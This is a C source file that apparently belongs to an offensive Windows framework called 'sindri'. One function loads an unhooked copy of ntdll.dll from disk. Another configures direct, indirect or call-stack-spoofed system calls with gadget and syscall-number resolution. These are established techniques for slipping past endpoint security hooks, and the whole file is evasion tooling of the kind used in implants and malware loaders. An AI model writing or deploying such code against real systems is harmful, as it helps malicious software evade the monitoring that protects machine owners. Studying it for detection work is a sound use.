#include <sindri.h>
#include <unified/syscall_cfg.h>

snd_status_t load_clean_ntdll(snd_buffer_t *buf, snd_ldr_pe_ctx_t *ctx, PVOID *out_base) {
    snd_status_t st = unified_file_load(API_SYS, "C:\\Windows\\System32\\ntdll.dll", buf);
    if (SND_FAILED(st))
        return st;

    ctx->mem_api    = &unified_mem_win;
    ctx->mod_api    = &unified_mod_win;
    ctx->raw_source = buf;

    st = snd_pe_parse(ctx->raw_source, FALSE, &ctx->pe);
    if (SND_FAILED(st))
        return st;

    ctx->stage = SND_STAGE_PARSED;
    st         = snd_ldr_pe_allocate_and_copy_image(ctx);
    if (SND_FAILED(st))
        return st;

    *out_base = ctx->target.local_base;
    snd_ntdll_set_clean(*out_base);
    return SND_OK;
}

void apply_syscall_style(const syscall_style_t *cfg) {
    if (cfg->invoke == INVOKE_DIRECT) {
        snd_syscall_set_invoker(snd_syscall_direct_invoke_asm);
    } else if (cfg->invoke == INVOKE_SPOOFED) {
        snd_syscall_set_spoof_finder(snd_syscall_find_spoof_scan);
        snd_syscall_set_invoker(snd_syscall_spoofed_invoke_asm);
    } else {
        snd_syscall_set_invoker(snd_syscall_indirect_invoke_asm);
    }

    snd_syscall_set_gadget_finder(snd_syscall_find_gadget_scan);

    if (!cfg->resolve_scan && !cfg->resolve_sort) {
        snd_syscall_set_resolver(snd_syscall_resolve_ssn_scan);
        snd_syscall_add_resolver(snd_syscall_resolve_ssn_sort);
    } else {
        BOOL first = TRUE;
        if (cfg->resolve_scan) {
            if (first) {
                snd_syscall_set_resolver(snd_syscall_resolve_ssn_scan);
                first = FALSE;
            } else {
                snd_syscall_add_resolver(snd_syscall_resolve_ssn_scan);
            }
        }
        if (cfg->resolve_sort) {
            if (first) {
                snd_syscall_set_resolver(snd_syscall_resolve_ssn_sort);
                first = FALSE;
            } else {
                snd_syscall_add_resolver(snd_syscall_resolve_ssn_sort);
            }
        }
    }
}
